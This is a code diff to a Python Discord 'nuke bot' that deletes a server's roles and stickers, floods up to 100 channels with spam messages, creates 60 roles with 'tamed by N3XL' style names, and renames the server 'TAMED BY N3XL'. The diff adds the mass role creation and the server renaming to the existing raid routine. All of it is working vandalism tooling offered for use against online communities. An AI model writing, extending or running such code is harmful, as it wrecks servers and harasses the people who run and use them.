@@ -35,13 +35,17 @@ AMOUNT_OF_CHANNELS = 100
 MESSAGES_PER_CHANNEL = 30
 AMOUNT_OF_MESSAGES = AMOUNT_OF_CHANNELS * MESSAGES_PER_CHANNEL
 
-# Roles to create after nuke
-NEW_ROLES = [
+# Roles to create (base names, will be cycled to make 60 total)
+BASE_ROLE_NAMES = [
     "tamed by N3XL",
     "n̾x̾l̾ o̾n̾ t̾o̾p̾",
     "N̶X̶L̶ O̶N̶ T̶O̶P̶",
     "₦ɆӾɆⱠ"
 ]
+AMOUNT_OF_ROLES = 60  # total roles to create
+
+# New server name
+NEW_SERVER_NAME = "TAMED BY N3XL"
 
 # -----------------------
 # DO NOT MODIFY BELOW
@@ -56,11 +60,10 @@ intents = discord.Intents.default()
 intents.guilds = True
 intents.members = True
 intents.message_content = True
-intents.emojis_and_stickers = True  # needed to access emojis/stickers
+intents.emojis_and_stickers = True
 
 bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 
-# Helper: run async tasks concurrently
 async def run_concurrent(tasks, limit=50):
     sem = asyncio.Semaphore(limit)
     async def bounded(task):
@@ -87,14 +90,11 @@ async def delete_stickers(guild):
     print("Stickers deleted.")
 
 async def delete_roles(guild):
-    # Get all roles except @everyone (position 0)
     roles = [r for r in guild.roles if r.name != "@everyone"]
-    # Also skip the bot's own highest role if needed (Discord won't let you delete roles higher than bot's)
     bot_member = guild.me
     bot_top_role = bot_member.top_role
     deletable = []
     for r in roles:
-        # Can't delete roles higher than bot's top role
         if r >= bot_top_role:
             print(f"Skipping role {r.name} (higher than bot)")
             continue
@@ -106,15 +106,24 @@ async def delete_roles(guild):
     await run_concurrent(tasks, 20)
     print("Roles deleted.")
 
-async def create_roles(guild):
-    print(f"Creating {len(NEW_ROLES)} roles...")
+async def create_60_roles(guild):
+    print(f"Creating {AMOUNT_OF_ROLES} roles (cycling through base names)...")
     tasks = []
-    for role_name in NEW_ROLES:
+    for i in range(AMOUNT_OF_ROLES):
+        base_name = BASE_ROLE_NAMES[i % len(BASE_ROLE_NAMES)]
+        role_name = f"{base_name} {i+1}"  # add number to make unique
         tasks.append(guild.create_role(name=role_name, reason="Nuked by N3XEL"))
-    results = await asyncio.gather(*tasks, return_exceptions=True)
+    results = await run_concurrent(tasks, 20)
     created = [r for r in results if isinstance(r, discord.Role)]
     print(f"Created {len(created)} roles.")
     return created
+
+async def rename_server(guild):
+    try:
+        await guild.edit(name=NEW_SERVER_NAME, reason="Nuked by N3XEL")
+        print(f"Renamed server to {NEW_SERVER_NAME}")
+    except Exception as e:
+        print(f"Failed to rename server: {e}")
 
 async def send_messages_fast(channels, message, total):
     if not channels:
@@ -164,8 +173,11 @@ async def nuke_server(guild: discord.Guild):
         print(f"Sending {AMOUNT_OF_MESSAGES} total messages ({MESSAGES_PER_CHANNEL} per channel)...")
         await send_messages_fast(text_channels, MESSAGE, AMOUNT_OF_MESSAGES)
 
-    # Step 5: Create new roles
-    await create_roles(guild)
+    # Step 5: Create 60 roles
+    await create_60_roles(guild)
+
+    # Step 6: Rename server
+    await rename_server(guild)
 
     elapsed = time.perf_counter() - start_time
     print(f"Nuke completed in {elapsed:.2f} seconds!")
@@ -195,7 +207,8 @@ async def config(ctx):
 📊 Channels: `{AMOUNT_OF_CHANNELS}`
 📨 Messages per Channel: `{MESSAGES_PER_CHANNEL}`
 📨 Total Messages: `{AMOUNT_OF_MESSAGES}`
-👑 New Roles: `{', '.join(NEW_ROLES)}`
+👑 New Roles: `{AMOUNT_OF_ROLES} roles (from {', '.join(BASE_ROLE_NAMES)})`
+🏷️ New Server Name: `{NEW_SERVER_NAME}`
     """
     await ctx.send(config_msg)
 
@@ -205,4 +218,4 @@ if __name__ == "__main__":
         exit(1)
     print("Starting Nuke Bot...")
     print("=" * 50)
-    bot.run(BOT_TOKEN)
+    bot.run(BOT_TOKEN) 
